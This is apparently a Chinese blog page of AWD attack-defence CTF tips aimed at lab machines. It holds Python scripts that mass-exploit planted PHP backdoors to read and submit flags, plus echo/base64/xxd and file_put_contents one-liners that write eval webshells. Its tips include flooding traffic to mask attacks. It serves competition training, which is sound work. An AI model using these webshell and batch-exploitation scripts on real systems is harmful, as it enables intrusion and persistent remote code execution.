+<p>&#x5728;&#x52A0;&#x56FA;&#x9636;&#x6BB5;&#xFF0C;&#x6BCF;&#x4E2A;&#x5821;&#x5792;&#x673A;&#x90FD;&#x6709;&#x4E00;&#x4E2A;Web&#x5728;&#x8FD0;&#x884C;&#x3002;&#x800C;&#x8FD9;&#x4E9B;&#x7AD9;&#x70B9;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x76F8;&#x5E94;&#x7684;&#x6F0F;&#x6D1E;&#x548C;&#x540E;&#x95E8;&#x3002;&#x57FA;&#x672C;&#x4E0A;&#x90FD;&#x4F1A;&#x6709;shell&#x7559;&#x5728;&#x9690;&#x79D8;&#x7684;&#x89D2;&#x843D;...</p>
+<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x524D;&#x671F;&#x641C;&#x5BFB;&#x5230;&#x7684;&#x540E;&#x95E8;&#xFF0C;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x3002;&#x8FD9;&#x91CC;&#x76F4;&#x63A5;&#x7528;linux&#x7684;&#x9632;&#x706B;&#x5899;&#x8FDB;&#x884C;&#x5173;&#x95ED;&#x5373;&#x53EF;&#x3002;</p>
+<p>&#x5728;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF1A;&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#x5C31;&#x76F4;&#x63A5;&#x628A;&#x7CFB;&#x7EDF;&#x7684;&#x540E;&#x95E8;&#x5168;&#x6740;&#x6389;&#x4E86;&#x3002;&#x53EA;&#x5141;&#x8BB8;22 80 21&#x7AEF;&#x53E3;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x8BBF;&#x95EE;&#x3002;</p>
+<p>&#x9996;&#x5148;&#x5F00;&#x542F; 22 80 21</p>
+<pre class="language-"><code>iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+iptables -A INPUT -p tcp --dport 21 -j ACCEPT
+</code></pre><p>&#x7136;&#x540E;&#x5173;&#x95ED;</p>
+<pre class="language-"><code>iptables -A INPUT -j DROP
+</code></pre><p>&#x5728;&#x624B;&#x52A8;&#x4E00;&#x4E2A;&#x4E2A;&#x8FDE;shell&#x6405;shi&#x7684;&#x8BDD;&#xFF0C;&#x662F;&#x975E;&#x5E38;&#x6162;&#x7684;&#x3002;&#x4E8E;&#x662F;&#x5199;&#x4E86;&#x4E2A;&#x5C0F;&#x811A;&#x672C;&#x3002;</p>
+<p>&#x904D;&#x5386;&#x6574;&#x4E2A;IP&#x6BB5;&#xFF0C;&#x5E76;&#x5C06;&#x9632;&#x706B;&#x5899;&#x5F00;&#x542F;&#x5168;&#x90E8;&#x5C4F;&#x853D;&#x6389;~~</p>
+<pre class="language-"><code>import requests
+url = &quot;http://192.168.182&quot;
+port=&apos;80&apos;
+shell = &quot;/shell.php&quot;
+passwd = &quot;a&quot;
+payloads = {
+    passwd:&quot;system(\&apos;iptables -A INPUT -j DROP&apos;);&quot;
+}
+for i in range(1,254):
+    urls = url+&quot;.&quot;+str(i)+&quot;:&quot;+port+shell
+    print(urls+&quot;\n&quot;)
+    try:
+        res = requests.post(urls,payloads,timeout=1)
+        print(res.text)
+    except:
+        print(&quot;&#x672A;&#x627E;&#x5230;&#x4E3B;&#x673A;&quot;)
+</code></pre><h1 id="&#x7F16;&#x5199;&#x6279;&#x91CF;&#x811A;&#x672C;">&#x7F16;&#x5199;&#x6279;&#x91CF;&#x811A;&#x672C;</h1>
+<p>&#x4EE5;&#x4E0B;&#x811A;&#x672C;&#x6765;&#x81EA;&#x4E8E;&#x6211;&#x6BD4;&#x8D5B;&#x65F6;&#x5199;&#x7684;&#x5783;&#x573E;&#x811A;&#x672C;&#xFF0C;&#x5927;&#x4F6C;&#x52FF;&#x55B7;&#x3002;</p>
+<h3 id="1&#x5229;&#x7528;&#x540E;&#x95E8;getflag">1.&#x5229;&#x7528;&#x540E;&#x95E8;getflag</h3>
+<p>&#x5355;&#x4E2A;shell&#x83B7;&#x53D6;flag</p>
+<pre class="language-"><code>import requests
+
+url=&quot;http://192.168.182.130/include/shell.php&quot;
+passwd=&quot;admin_ccmd&quot;
+payload = {passwd: &apos;system(\&apos;cat /f*\&apos;);&apos;}
+res=requests.post(url,payload)
+print(res.text)
+</code></pre><h3 id="2&#x540E;&#x95E8;&#x6279;&#x91CF;getflag">2.&#x540E;&#x95E8;&#x6279;&#x91CF;getflag</h3>
+<p>&#x9488;&#x5BF9;&#x7AEF;&#x53E3;&#x53D8;&#x5316;&#x5229;&#x7528;&#x540E;&#x95E8;&#x6279;&#x91CF;&#x83B7;&#x53D6;flag</p>
+<pre class="language-"><code>import requests
+
+url1=&quot;http://192.168.182.130:&quot;
+url2=&quot;&quot;
+
+flaglist=[]
+
+path=&quot;/include/shell.php&quot;
+passwd=&quot;admin_ccmd&quot;
+
+
+#payload = {passwd: &apos;system(\&apos;cat /f*\&apos;);&apos;}
+payload = {passwd: &apos;system(\&apos;cat /flag\&apos;);&apos;}
+
+i = 0
+
+for url2 in range(8801,8805):
+    url = url1 + str(url2) +path
+
+    res=requests.post(url,payload)
+    try:
+        print(url1 + str(url2),res.text)
+        # flag&#x5B58;&#x5165;&#x5217;&#x8868;&#x4E2D;
+        flaglist.append(str(res.text))
+        #print(flaglist[i])
+        i += 1
+    except:
+        pass
+</code></pre><h3 id="3&#x5229;&#x7528;&#x540E;&#x95E8;&#x6279;&#x91CF;getflag&#x5E76;&#x63D0;&#x4EA4;">3.&#x5229;&#x7528;&#x540E;&#x95E8;&#x6279;&#x91CF;getflag&#x5E76;&#x63D0;&#x4EA4;</h3>
+<p>burp&#x6293;&#x5305;&#xFF0C;&#x53D1;&#x73B0;flag&#x4EE5;json&#x5F62;&#x5F0F;&#x4F20;&#x8F93;</p>
+<pre class="language-"><code>POST /api/flag HTTP/1.1
+Host: 192.168.182.130:39999
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+Accept: application/json, text/plain, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/json;charset=utf-8
+Authorization: 9ad36c305d6a2d2514434a4c10e7e13f
+Content-Length: 55
+Origin: http://192.168.182.130:39999
+Connection: close
+Referer: http://192.168.182.130:39999/
+
+{&quot;flag&quot;:&quot;SL{7a2ecc20361b7a104798b6bba6222b3972e114a2}&quot;}
+</code></pre><p>&#x7F16;&#x5199;&#x811A;&#x672C;&#x81EA;&#x52A8;&#x83B7;&#x53D6;flag&#x5E76;&#x63D0;&#x4EA4;</p>
+<pre class="language-"><code># coding: UTF-8
+import requests
+import json
+
+url1=&quot;http://xxxx:&quot;
+url2=&quot;&quot;
+
+flaglist=[]
+
+path=&quot;/include/shell.php&quot;
+passwd=&quot;admin_ccmd&quot;
+
+flagadd=&quot;http://xxxx:8801/api/flag&quot;   #&#x63D0;&#x4EA4;flag&#x7684;&#x5730;&#x5740;
+
+#payload = {passwd: &apos;system(\&apos;cat /f*\&apos;);&apos;}
+payload = {passwd: &apos;system(\&apos;cat /flag\&apos;);&apos;}
+
+
+headers={
+        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&apos;,
+    }
+headersflag={
+        &apos;Host&apos;: &apos;xxxx&apos;,
+        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&apos;,
+        &apos;Accept&apos;: &apos;application/json, text/plain, */*&apos;,
+        &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;,
+        &apos;Content-Type&apos;: &apos;application/json;charset=utf-8&apos;,
+        &apos;Authorization&apos;: &apos;bada82467423a6526d4d25abbe8cc43a&apos;,
+        &apos;Origin&apos;: &apos;http://xxxx&apos;,
+        &apos;Referer&apos;: &apos;http://xxxx/&apos;,
+    }
+
+i = 0
+
+for url2 in range(8802,8810):
+    url = url1 + str(url2) +path
+    #print(url1 + str(url2))
+    res=requests.post(url,payload, headers=headers)
+    try:
+        print(url1 + str(url2),res.text)
+        # flag&#x5B58;&#x5165;&#x5217;&#x8868;&#x4E2D;
+        flaglist.append(str(res.text))
+        #print(flaglist[i])
+        body = {&quot;flag&quot;: str(flaglist[i])}
+        res = requests.post(flagadd, headers=headersflag, data=json.dumps(body))
+        i += 1
+    except:
+        pass
+</code></pre><p>&#x5982;&#x679C;&#x5ACC;&#x5199;&#x811A;&#x672C;&#x9EBB;&#x70E6;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;flag&#x5B58;&#x5165;&#x5B57;&#x5178;&#xFF0C;&#x5229;&#x7528;burp&#x7206;&#x7834;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x6279;&#x91CF;&#x63D0;&#x4EA4;flag&#x3002;&#x4E0D;&#x8FC7;&#x5927;&#x62EC;&#x53F7;<code>{}</code>&#x53EF;&#x80FD;&#x4F1A;&#x88AB;&#x7F16;&#x7801;&#x5BFC;&#x81F4;flag&#x9519;&#x8BEF;&#x3002;</p>
+<h3 id="4&#x5229;&#x7528;&#x540E;&#x95E8;&#x5199;shell">4.&#x5229;&#x7528;&#x540E;&#x95E8;&#x5199;shell</h3>
+<p>&#x9884;&#x7559;&#x540E;&#x95E8;&#x53EF;&#x80FD;&#x4F1A;&#x88AB;&#x5220;&#x9664;&#xFF0C;&#x8981;&#x60F3;&#x6301;&#x7EED;&#x62FF;&#x5206;&#x9700;&#x8981;&#x5199;shell&#xFF0C;&#x8FD9;&#x91CC;&#x5229;&#x7528;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x548C;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6765;&#x5199;&#x9A6C;
+<strong>&#x5229;&#x7528;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x5199;&#x9A6C;</strong></p>
+<pre class="language-"><code>1.Linux&#x4E0B;&#x5199;shell
+$ echo &quot;<span class="token prolog">&lt;?php @eval(\$_POST[123]); ?&gt;</span>&quot; &gt; webshell.php
+$ echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d &gt; webshell.php   #base64&#x7F16;&#x7801;&#x7ED5;&#x8FC7;
+$ echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php #xxd&#x7ED5;&#x8FC7;
+
+
+2.windows&#x4E0B;&#x5199;shell
+&gt;echo ^<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>?php</span> <span class="token attr-name">eval($^_POST[123]);</span> <span class="token attr-name">?^</span><span class="token punctuation">&gt;</span></span> &gt; webshell.php
+</code></pre><p><strong>&#x5229;&#x7528;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x5199;&#x9A6C;</strong></p>
+<pre class="language-"><code>?code=fputs(fopen(&apos;./webshell.php.php&apos;,&apos;w&apos;),&apos;<span class="token prolog">&lt;?php @eval($_POST[123]);?&gt;</span>&apos;);
+
+?code=file_put_contents(&apos;webshell.php.php&apos;, &apos;<span class="token prolog">&lt;?php @eval($_POST[123]); ?&gt;</span> &apos;);
+
+?code=file_put_contents($_POST[f], $_POST[d]); 
+post: f=webshell.php&amp;d=<span class="token prolog">&lt;?php @eval($_POST[123]); ?&gt;</span>
+</code></pre><p>&#x7136;&#x540E;&#x5229;&#x7528;&#x811A;&#x672C;&#x5B9E;&#x73B0;</p>
+<pre class="language-"><code># coding: UTF-8
+import requests
+
+url = &quot;http://192.168.182.130:8808&quot;
+
+shell_path = url + &quot;/include/shell.php&quot;
+shell_passwd = &quot;admin_ccmd&quot;
+
+#&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;
+payload = {shell_passwd: &apos;system(\&apos;cat /f*\&apos;);&apos;}
+res = requests.post(shell_path, payload)
+print(res.text)
+
+
+#payload1&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#x4E0A;&#x4F20;shell
+payload1 = {shell_passwd: &apos;system(\&apos;echo &quot;<span class="token prolog">&lt;?php @eval(\$_POST[atkx]);?&gt;</span>&quot; &gt; /var/www/html/atkx.php\&apos;);&apos;}
+res = requests.post(shell_path, payload1)
+print(&quot;shell&#x5DF2;&#x4E0A;&#x4F20;&quot;)
+
+#payload2&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#x4E0A;&#x4F20;shell&#xFF0C;&#x5E76;getflag
+my_shell_path = url + &quot;/atkx.php&quot;
+my_shell_passwd = &quot;atkx&quot;
+payload2 = {my_shell_passwd: &apos;system(\&apos;cat /f*\&apos;);&apos;}
+res = requests.post(my_shell_path, payload2)
+print(res.text)
+</code></pre><p>&#x6279;&#x91CF;&#x540E;&#x95E8;&#x5199;shell</p>
+<pre class="language-"><code>import requests
+
+url_head=&quot;http://192.168.182.130&quot;
+for url2 in range(8801,8805):
+    try:
+        url =  url_head+&quot;:{}&quot;.format(url2)
+
+        shell_path = url + &quot;/include/shell.php&quot;
+        shell_passwd = &quot;admin_ccmd&quot;
+        print(shell_path)
+
+        #payload1&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#x4E0A;&#x4F20;shell
+        payload1 = {shell_passwd: &apos;system(\&apos;echo &quot;<span class="token prolog">&lt;?php @eval(\$_POST[atkx]);?&gt;</span>&quot; &gt; /var/www/html/atkx1.php\&apos;);&apos;}
+        res = requests.post(shell_path, payload1)
+        print(url + &quot; shell&#x5199;&#x5165;&#x6210;&#x529F;&#xFF01;&#xFF01;&#xFF01;&#xFF01;&#xFF01;&#xFF01;&#xFF01;&quot;)
+        #
+
+        # #payload2&#x901A;&#x8FC7;&#x4E0A;&#x4F20;&#x7684;shell&#x6765;getflag
+        # my_shell_path = url + &quot;/atkx1.php&quot;
+        # my_shell_passwd = &quot;atkx&quot;
+        # payload2 = {my_shell_passwd: &apos;system(\&apos;cat /flag\&apos;);&apos;}
+        # res = requests.post(my_shell_path, payload2)
+        # print(url,res.text)
+    except:
+        pass
+</code></pre><h1 id="&#x603B;&#x7ED3;">&#x603B;&#x7ED3;</h1>
+<p>1.&#x9884;&#x7559;&#x540E;&#x95E8;&#x7684;&#x6743;&#x9650;&#x7EF4;&#x6301;&#x7279;&#x522B;&#x91CD;&#x8981;&#xFF0C;&#x4E0D;&#x8981;&#x6025;&#x7740;&#x62FF;flag&#xFF0C;&#x5F80;&#x540E;&#x6BCF;&#x4E00;&#x8F6E;&#x9884;&#x7559;&#x540E;&#x95E8;&#x90FD;&#x4F1A;&#x51CF;&#x5C11;&#x3002;</p>
+<p>2.AWD&#x4E00;&#x822C;&#x4F7F;&#x7528;&#x7684;&#x662F;cms&#xFF0C;&#x5C3D;&#x91CF;&#x591A;&#x6536;&#x96C6;&#x4E00;&#x4E9B;cms&#x7684;POC&#x548C;EXP&#xFF0C;&#x4EE5;&#x5907;&#x4E0D;&#x65F6;&#x4E4B;&#x9700;&#x3002;</p>
+<p>3.&#x9632;&#x5B88;&#x6CE8;&#x610F;&#x67E5;&#x770B;&#x65E5;&#x5FD7;&#x770B;&#x522B;&#x4EBA;&#x662F;&#x600E;&#x4E48;&#x653B;&#x51FB;&#x81EA;&#x5DF1;&#x7684;&#xFF0C;&#x7136;&#x540E;&#x5C1D;&#x8BD5;&#x653B;&#x51FB;&#x5176;&#x4ED6;&#x4EBA;&#xFF0C;&#x4E3A;&#x4E86;&#x5E72;&#x6270;&#x522B;&#x4EBA;&#xFF0C;&#x53EF;&#x4EE5;&#x5148;&#x6253;&#x4E00;&#x6CE2;&#x6D41;&#x91CF;&#xFF0C;&#x6DF7;&#x6DC6;&#x89C6;&#x542C;&#x3002;</p>
+<p>4.&#x68C0;&#x67E5;&#x540E;&#x95E8;&#xFF0C;&#x4FDD;&#x8BC1;&#x81EA;&#x5DF1;&#x7684;&#x7F51;&#x7AD9;&#x4E0A;&#x6CA1;&#x6709;d&#x76FE;&#x53EF;&#x4EE5;&#x626B;&#x51FA;&#x6765;&#x7684;&#x540E;&#x95E8;&#xFF0C;&#x68C0;&#x67E5;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#x6216;&#x8005;&#x53EF;&#x7591;&#x8FDB;&#x7A0B;&#x3002;</p>
+<p>5.&#x6BD4;&#x8D5B;&#x4E00;&#x8F6E;&#x5927;&#x6982;&#x51E0;&#x5206;&#x949F;&#xFF0C;&#x65F6;&#x95F4;&#x6BD4;&#x8F83;&#x7D27;&#x5F20;&#xFF0C;&#x9700;&#x8981;&#x63D0;&#x9AD8;&#x81EA;&#x5DF1;&#x7684;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x80FD;&#x529B;&#x4EE5;&#x53CA;&#x81EA;&#x52A8;&#x5316;&#x811A;&#x672C;&#x7684;&#x7F16;&#x5199;&#x80FD;&#x529B;&#xFF0C;&#x5B9E;&#x73B0;&#x81EA;&#x52A8;&#x5316;&#x653B;&#x51FB;&#x3002;</p>
+<p>&#x53C2;&#x8003;&#x6587;&#x7AE0;&#xFF1A;
+<a href="https://blog.csdn.net/weixin_43510203/article/details/118519120" target="_blank">https://blog.csdn.net/weixin_43510203/article/details/118519120</a>
+<a href="https://www.likecs.com/show-306005446.html" target="_blank">https://www.likecs.com/show-306005446.html</a>
+<a href="https://www.anquanke.com/post/id/86984" target="_blank">https://www.anquanke.com/post/id/86984</a>
+<a href="https://xz.aliyun.com/t/10995" target="_blank">https://xz.aliyun.com/t/10995</a> </p>
+<footer class="page-footer"><span class="copyright">&#x8D63;ICP&#x5907;2023008387&#x53F7;-1 &#x8D63;&#x516C;&#x7F51;&#x5B89;&#x5907;36052102100040&#x53F7; Copyright &#xA9;2022 - 2024 By Feiyu</span><span class="footer-modification">&#x6700;&#x8FD1;&#x4E00;&#x4FEE;&#x6539;&#x65F6;&#x95F4;&#xFF1A;
+2024-11-15 21:49
+</span></footer>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="服务配置文件探测.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: 服务配置文件探测">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"浅谈AWD攻防赛的生存攻略","date":"2024-09-25T14:30:33.000Z","updated":"2024-11-15T21:49:39.000Z","categories":["网络安全","AWD"],"tags":["AWD","网络安全"],"permalink":"/posts/浅谈AWD攻防赛的生存攻略/","level":"1.4.1.11","depth":3,"next":{"title":"CTF竞赛","level":"1.4.2","depth":2,"ref":"","articles":[{"title":"蓝桥杯","level":"1.4.2.1","depth":3,"ref":"","articles":[{"title":"Crypto","level":"1.4.2.1.1","depth":4,"ref":"","articles":[{"title":"Backdoor","level":"1.4.2.1.1.1","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/backdoor.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/backdoor.md","articles":[]},{"title":"Classical","level":"1.4.2.1.1.2","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/classical.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/classical.md","articles":[]},{"title":"Cyber Chef","level":"1.4.2.1.1.3","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef.md","articles":[]},{"title":"Cyber Chef 2","level":"1.4.2.1.1.4","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef2.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/CyberChef2.md","articles":[]},{"title":"RSA","level":"1.4.2.1.1.5","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/RSA.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/RSA.md","articles":[]},{"title":"基于国密SM2算法的密钥密文分发","level":"1.4.2.1.1.6","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Crypto/基于国密SM2算法的密钥密文分发.md","ref":"网络安全/CTF竞赛/蓝桥杯/Crypto/基于国密SM2算法的密钥密文分发.md","articles":[]}]},{"title":"Misc","level":"1.4.2.1.2","depth":4,"ref":"","articles":[{"title":"58与64","level":"1.4.2.1.2.1","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/58与64.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/58与64.md","articles":[]},{"title":"AdvDetPatch（未完成）","level":"1.4.2.1.2.2","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/AdvDetPatch（未完成）.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/AdvDetPatch（未完成）.md","articles":[]},{"title":"Blue Monday","level":"1.4.2.1.2.3","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/BlueMonday.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/BlueMonday.md","articles":[]},{"title":"Classica 10","level":"1.4.2.1.2.4","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/Classica10.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/Classica10.md","articles":[]},{"title":"Easy Crack Me","level":"1.4.2.1.2.5","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/EasyCrackMe.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/EasyCrackMe.md","articles":[]},{"title":"Embarrass","level":"1.4.2.1.2.6","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/embarrass.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/embarrass.md","articles":[]},{"title":"Find The Flag","level":"1.4.2.1.2.7","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/find_the_flag.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/find_the_flag.md","articles":[]},{"title":"Flooding","level":"1.4.2.1.2.8","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/flooding.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/flooding.md","articles":[]},{"title":"Happy 2 Forensics","level":"1.4.2.1.2.9","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/happy2forensics.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/happy2forensics.md","articles":[]},{"title":"Matrix","level":"1.4.2.1.2.10","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/Matrix.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/Matrix.md","articles":[]},{"title":"Piphack","level":"1.4.2.1.2.11","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/piphack.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/piphack.md","articles":[]},{"title":"Puzzle","level":"1.4.2.1.2.12","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/puzzle.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/puzzle.md","articles":[]},{"title":"Py Ha Ha","level":"1.4.2.1.2.13","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/PyHaHa.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/PyHaHa.md","articles":[]},{"title":"Pyshell","level":"1.4.2.1.2.14","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/pyshell.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/pyshell.md","articles":[]},{"title":"Random","level":"1.4.2.1.2.15","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/Random.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/Random.md","articles":[]},{"title":"Re Creators","level":"1.4.2.1.2.16","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/ReCreators.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/ReCreators.md","articles":[]},{"title":"SCAN","level":"1.4.2.1.2.17","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/SCAN.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/SCAN.md","articles":[]},{"title":"Shellcode","level":"1.4.2.1.2.18","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/shellcode.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/shellcode.md","articles":[]},{"title":"Warning","level":"1.4.2.1.2.19","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/Warning.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/Warning.md","articles":[]},{"title":"Wordle","level":"1.4.2.1.2.20","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/Wordle.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/Wordle.md","articles":[]},{"title":"ZIP","level":"1.4.2.1.2.21","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/ZIP.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/ZIP.md","articles":[]},{"title":"传感器1","level":"1.4.2.1.2.22","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/传感器1.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/传感器1.md","articles":[]},{"title":"传感器2","level":"1.4.2.1.2.23","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/传感器2.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/传感器2.md","articles":[]},{"title":"古典密码","level":"1.4.2.1.2.24","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/古典密码.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/古典密码.md","articles":[]},{"title":"小苹果","level":"1.4.2.1.2.25","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/小苹果.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/小苹果.md","articles":[]},{"title":"小试身手","level":"1.4.2.1.2.26","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/小试身手.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/小试身手.md","articles":[]},{"title":"段子","level":"1.4.2.1.2.27","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/段子.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/段子.md","articles":[]},{"title":"登机牌","level":"1.4.2.1.2.28","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/登机牌.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/登机牌.md","articles":[]},{"title":"盲人隐藏了起来","level":"1.4.2.1.2.29","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/盲人隐藏了起来.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/盲人隐藏了起来.md","articles":[]},{"title":"签到卡","level":"1.4.2.1.2.30","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/签到卡.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/签到卡.md","articles":[]},{"title":"蚁剑流量","level":"1.4.2.1.2.31","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/蚁剑流量.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/蚁剑流量.md","articles":[]},{"title":"被加密的生产流量","level":"1.4.2.1.2.32","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/被加密的生产流量.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/被加密的生产流量.md","articles":[]},{"title":"要想会，先学会","level":"1.4.2.1.2.33","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/要想会，先学会.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/要想会，先学会.md","articles":[]}]},{"title":"Reverse","level":"1.4.2.1.3","depth":4,"ref":"","articles":[{"title":"Baby RE","level":"1.4.2.1.3.1","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/BabyRE.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/BabyRE.md","articles":[]},{"title":"Base 64","level":"1.4.2.1.3.2","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/Base64++.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/Base64++.md","articles":[]},{"title":"BWBA","level":"1.4.2.1.3.3","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/BWBA.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/BWBA.md","articles":[]},{"title":"Crack Me 01","level":"1.4.2.1.3.4","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/CrackMe01.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/CrackMe01.md","articles":[]},{"title":"Crack Me 02","level":"1.4.2.1.3.5","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/CrackMe02.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/CrackMe02.md","articles":[]},{"title":"Emoji 